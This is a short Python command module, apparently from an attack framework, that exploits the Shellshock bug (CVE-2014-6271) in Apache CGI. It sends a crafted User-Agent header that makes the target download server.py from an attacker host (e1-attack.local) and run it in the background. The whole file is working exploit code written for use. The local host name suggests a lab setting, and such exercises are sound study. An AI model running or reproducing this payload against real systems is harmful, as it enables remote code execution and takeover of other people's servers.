from ..commands import Command
import requests

def send_shellshock_payload(target: str) -> None:
    """Send the Shellshock exploit payload to the target"""
    url = f"http://{target}/cgi-bin/shockme.cgi"
    command = "wget http://e1-attack.local:8080/server.py -O /tmp/server.py && python3 /tmp/server.py &"
    payload = f"() {{ :; }}; {command}"

    try:
        response = requests.get(url, headers={"User-Agent": payload})
        print(f"[+] Payload sent. Status: {response.status_code}")
    except requests.exceptions.ConnectionError:
        print(f"[!] Could not connect to {target}")
    except requests.exceptions.Timeout:
        print(f"[!] Request timed out")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")

class shellshock(Command):
    """
    Exploit Shellshock (CVE-2014-6271) on a target running vulnerable Apache CGI.
    Usage: shellshock <target>
    """
    def do_command(self, lines: str):
        line = lines.split(" ")
        target = line[0]
        send_shellshock_payload(target)


command = shellshock